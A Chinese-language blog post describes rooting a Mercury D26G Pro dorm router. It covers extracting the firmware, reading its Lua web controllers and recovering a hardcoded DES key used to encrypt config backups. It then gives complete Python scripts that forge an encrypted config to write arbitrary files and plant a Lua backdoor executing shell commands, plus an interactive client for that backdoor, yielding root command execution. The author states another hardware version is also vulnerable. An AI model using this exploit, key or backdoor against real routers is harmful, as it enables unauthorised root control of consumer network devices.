---
title: 如何日了宿舍路由器
date: 2022-03-11
tags:
  - iot
  - 0day
category: iot
---

# 如何日了宿舍路由器

昨天晚上下游戏下得太慢了，所以想找点既不占网速又能搞一会的事，就想起来宿舍路由器还没玩过，不如日下路由器吧。

## 信息收集

咱宿舍路由器版本

![image-20220311100114440](https://cdn.yoshino-s.online//typora_img/image-20220311100114440.png)

固件版本 **1.0.6 Build 190829 Rel.45538n** ，去官网找一下对应版本固件号。

> 为什么不把路由器拆了读固件呢，因为我懒。。。想用纯软件手段日了。
>
> 后面发现其实连串口就能日但是还是因为我懒。。。

## 获得固件

官网下载喽

![image-20220311100346819](https://cdn.yoshino-s.online//typora_img/image-20220311100346819.png)

不知道我是V1还是V2但是先下一个版本类似的V1看看吧。

```bash
binwalk -e d26gprov1.bin
cd _d26gprov1.bin.extracted && ls
# 10400  10400.7z  177588.squashfs  37EC  37EC.7z  squashfs-root
#squashfs-root
#├── bin
#├── data
#├── dev
#├── etc
#├── etc_ro
#├── lib
#├── mnt
#├── overlay
#├── proc
#├── rom
#├── root
#├── sbin
#├── sys
#├── tmp
#├── usr
#├── var -> /tmp
#└── www
```

挺好的，就这样呗

## 固件分析

### 信息收集

先看看kernel版本

```bash
strings 10400 | grep Linux
# Linux version 3.10.14 (tplink@tplink-0B) (gcc version 4.6.3 20120201 (prerelease) (Linaro GCC 4.6-2012.02) ) #1 SMP Wed Nov 8 10:04:29 CST 2017
file squashfs-root/bin/busybox
# squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, no section header
```

然后看看里面有啥

![image-20220311101054054](https://cdn.yoshino-s.online//typora_img/image-20220311101054054.png)

![image-20220311101112750](https://cdn.yoshino-s.online//typora_img/image-20220311101112750.png)

![image-20220311101207681](https://cdn.yoshino-s.online//typora_img/image-20220311101207681.png)

明显就是个openwrt定制版，看看版本没已知漏洞，只能自己挖了。cgi-bin有两个路由，但是实测访问不到，他用了另一套路由。

### 路由探索

这里就体现了真机的好处，直接去看他走的啥路由，就不用模拟了。（嘿嘿嘿，我好懒

![image-20220311101342823](https://cdn.yoshino-s.online//typora_img/image-20220311101342823.png)

然后就是找对应的controller然后找功能点，比如命令注入啥的。

简单分析一下就发现路由入口在`/usr/lib/lua/luci/controller/ds.lua`

```lua
function ds()
    local t = {}
    local l = require("luci.json")
    local r = require("luci.http.protocol")
    local n = d.jsondata()
    n = n or l.decode(d.get_raw_data() or "", r.urldecode) or {}
    if not n then
        t[e.NAME] = e.EINVFMT
        write_json(t)
        return
    end
    local r = n[KEY_METHOD]
    local l = {
        [METHOD_DO] = do_action,
        [METHOD_ADD] = set_data,
        [METHOD_DELETE] = set_data,
        [METHOD_MODIFY] = set_data,
        [METHOD_GET] = get_data
    }
    n[KEY_METHOD] = nil
    local l = l[r]
    if l then
        t = l(n, r)
    else
        t[e.NAME] = e.EINVINSTRUCT
    end
    write_json(t)
end
```

大概就是POST一个json，然后根据`method`字段选择对应的操作。注册操作在`/usr/lib/lua/luci/controller/admin/`目录下的文件里。先去看功能点吧。

### 好像找到了？

在`/usr/lib/lua/luci/controller/admin/weather.lua`里，有个很显然的命令注入。

![image-20220311102216819](https://cdn.yoshino-s.online//typora_img/image-20220311102216819.png)

但是后来发现怎么构造都访问不到，后来发现是因为版本问题，我手头路由器没有这个功能点。。。

但不管了，我们继续挖，然后发现其他地方要么做了过滤，要么压根不可控。但是功夫不负有心人，我发现了一个疑似的点。

### 什么傻逼算法

路由器有这么一个功能，导入导出配置

![image-20220311102515870](https://cdn.yoshino-s.online//typora_img/image-20220311102515870.png)

后台路由长这样

```lua
function download_conf()
    local n = require("luci.fs")
    local r = require("luci.torchlight.util")
    local t = {}
    local o = string.format("%s/%s", BACK_TMP_DIRPATH, CONF_TMP_NAME)
    if not r.merge_conf_list(l.CONFIG_DIR_PATHS, l.CONFIG_FILE_PATHS, l.EXCLUDE_FILE_PATHS, BACK_TMP_DIRPATH, o) then
        t[e.NAME] = e.EEXPT
        luci.http.prepare_content("application/json")
        luci.http.write_json(t)
        return
    end
    if not n.isfile(o) then
        t[e.NAME] = e.EEXPT
        luci.http.prepare_content("application/json")
        luci.http.write_json(t)
        return
    end
    luci.http.header('Content-Disposition', 'attachment; filename=' .. CONF_BIN_FILENAME)
    luci.http.prepare_content("application/octet-stream")
    local t = assert(io.open(o, "rb"))
    while true do
        local e = t:read(BUFSIZE)
        if e == nil then
            break
        end
        luci.http.write(e)
    end
    t:close()
    n.unlink(o)
end

function upload_conf()
    local c = require("luci.fs")
    local n = require("luci.torchlight.util")
    local i = require("luci.model.uci").cursor()
    local r = string.format("%s/%s", RES_TMP_DIRPATH, CONF_TMP_NAME)
    local o = string.format("%s/decrypt_conf", RES_TMP_DIRPATH)
    local o = {}
    o[e.NAME] = e.ENONE
    luci.http.prepare_content("text/html")
    if not c.mkdir(RES_TMP_DIRPATH, true) then
        o[e.NAME] = e.EEXPT
        luci.http.write_json(o)
        return
    end
    content_len = n.get_http_content_len()
    if content_len > l.MAX_CONF_FILE_SIZE then
        o[e.NAME] = e.EFILETOOBIG
        luci.http.write_json(o)
        luci.http.setfilehandler(function(e, e, e)
        end)
        luci.http.formvalue("filename")
        return
    end
    local l
    luci.http.setfilehandler(function(o, e, t)
        if not l then
            l = io.open(r, "w")
        end
        if e then
            l:write(e)
        end
        if t then
            l:close()
        end
    end)
    luci.http.formvalue("filename")
    local l, r = n.parse_conf(r, RES_TMP_DIRPATH)
    if not l then
        o[e.NAME] = r
        luci.http.write_json(o)
        return
    end
    i:commit_all()
    o[t.uciMoudleSpec.dynOptName.waitTime] = n.get_wait_time(t.uciMoudleSpec.optName.restore) or DEFAULT_RESTORE_TIME
    luci.http.write_json(o)
end
```

下载的配置文件是加密的，但没关系，源码都有了，逆一下不是问题。

我们可以发现他生成的时候是这样写的

```lua
r.merge_conf_list(l.CONFIG_DIR_PATHS, l.CONFIG_FILE_PATHS, l.EXCLUDE_FILE_PATHS, BACK_TMP_DIRPATH, o)
```

他似乎读了几个文件，然后合并进结果了。但是在解析的时候，却没有传这几个参数，直接parse了，那我们进行一个大胆的猜测，有任意文件写！

话不多说，我们先来日了他的配置生成和parse

这个方法全在`/usr/lib/lua/luci/torchlight/utils.lua`里，前面的我们不care，关键是先给他解密了再说

```lua
local d = l("luci.lib.des")
-- DES_KEY = "jklsd*%&%HDFG767" -- 在/usr/lib/lua/luci/torchlight/setting.lua
if o.ENONE ~= d.encrypt(t, a.DES_KEY, c) then 
    n.unlink(t)
    return false
end
```

加解密逻辑也挺简单的，就一个des，但是这个des很玄学，key传了个16位的，压根对不上，也没写模式和iv，还tm是的so。

![image-20220311103200862](https://cdn.yoshino-s.online//typora_img/image-20220311103200862.png)

怎么办，ida呗。

![image-20220311103420993](https://cdn.yoshino-s.online//typora_img/image-20220311103420993.png)

管他写了啥，直接找找开源实现，天下代码一大抄，我直接在github上找到了一模一样的实现，嘻嘻

![image-20220311103601385](https://cdn.yoshino-s.online//typora_img/image-20220311103601385.png)

那不管了，直接给他解一下呗

![image-20220311103657737](https://cdn.yoshino-s.online//typora_img/image-20220311103657737.png)

挺好看的哦，直接进行一个猜测，第一行就是剩下的内容md5加上版本签名。回去看看源码(`/usr/lib/lua/luci/torchlight/utils.lua#append_md5_header`)也确实这么写的。然后看一下他的parse，这里就不详细分析代码了，反正就是分离出来然后直接覆盖掉`FILE_PATH`位置上的文件。那不就成了！

## POC&EXP

这里我们构造一个POC

```python
import os
import requests
import hashlib
import random

stok = "8506481037c7b6f28fd834e1affad2b3"

url = "http://192.168.1.1"

u = f"{url}/stok={stok}/admin/system/upload_conf"

poc = random.randbytes(16).hex()

files = {
    "/www/web-static/poc": poc,
}

def gen():
    file = ""
    for name, content in files.items():
        file+="@FILE_START@------------------------------------------\n"
        file+="@FILE_PATH@="+name+"\n"
        file+=content+"\n"
        file+="@FILE_END@------------------------------------------\n"
    md5 = hashlib.md5(file.encode("utf-8")).hexdigest()
    file = md5 + ",D26G Pro 2.0\n"+file
    with open("config.txt", "w") as f:
        f.write(file)
    os.system('./test encrypt "jklsd*%&%HDFG767" config.txt config.bin && rm config.txt')
    with open("config.bin", "rb") as f:
        return f.read()

resp = requests.post(u, files={
    "file": ("config.bin", gen()),
}).json()

print(resp)

resp = requests.get(url + "/web-static/poc").text.strip()

if resp == poc:
    print("poc success")
else:
    print("poc fail", resp, poc)
```

![image-20220311104727490](https://cdn.yoshino-s.online//typora_img/image-20220311104727490.png)

成了，写cgi-bin没法+x执行不了，所以直接写rcS之类的，在这里我选择随便找个路由写个后门就完事了。exp如下

```python
import os
from time import sleep
import requests
import hashlib
import random

stok = "8506481037c7b6f28fd834e1affad2b3"

url = "http://192.168.1.1"

u = f"{url}/stok={stok}/admin/system/upload_conf"

poc = random.randbytes(16).hex()

files = {
    "/www/web-static/poc": poc,
    "/usr/lib/lua/luci/controller/admin/dmz.lua": """
local n = require("luci.torchlight.error")
module("luci.controller.admin.dmz", package.seeall)
function index()
    entry({"pc", "DMZCfg.htm"}, template("admin/DMZCfg")).leaf = true
    register_keyword_action("backdoor", "backdoor", "backdoor")
end
function backdoor(d)
    local e = {}
    if type(d) ~= "string" then
        return n.EINVARG
    end
    e["cmd"] = d
    local r = luci.sys.exec(d)
    e["result"] = r
    return n.ENONE, e
end
    """
}

def gen():
    file = ""
    for name, content in files.items():
        file+="@FILE_START@------------------------------------------\n"
        file+="@FILE_PATH@="+name+"\n"
        file+=content+"\n"
        file+="@FILE_END@------------------------------------------\n"
    md5 = hashlib.md5(file.encode("utf-8")).hexdigest()
    file = md5 + ",D26G Pro 2.0\n"+file
    with open("config.txt", "w") as f:
        f.write(file)
    os.system('./test encrypt "jklsd*%&%HDFG767" config.txt config.bin && rm config.txt')
    with open("config.bin", "rb") as f:
        return f.read()

resp = requests.post(u, files={
    "file": ("config.bin", gen()),
}).json()

print(resp)

resp = requests.get(url + "/web-static/poc").text.strip()

if resp == poc:
    print("poc success")
else:
    print("poc fail", resp, poc)
```

然后重启，然后访问一下看看

```python
from urllib.parse import unquote
import requests

stok = "49e7e9b0c6607228a6a68d8fb9271c95"

url = "http://192.168.1.1"

u = f"{url}/stok={stok}/admin/system/upload_conf"

while True:
    cmd = input("$ ")

    resp = unquote(requests.post(f"{url}/stok={stok}/ds", json={
        "backdoor": {"backdoor": cmd}, "method": "do"
    }).json()["result"]).replace("\\n", "\n")

    print(resp)

```

![image-20220311104922374](https://cdn.yoshino-s.online//typora_img/image-20220311104922374.png)

RCE了，root权限，剩下来的就随便玩玩啦。

> 经过分析D26G Pro V2也存在该漏洞，其他路由器暂未测试，怀疑均存在此类漏洞，有空看看吧

## 链接

固件下载 https://service.mercurycom.com.cn/download-search.html?kw=D26G&classtip=all

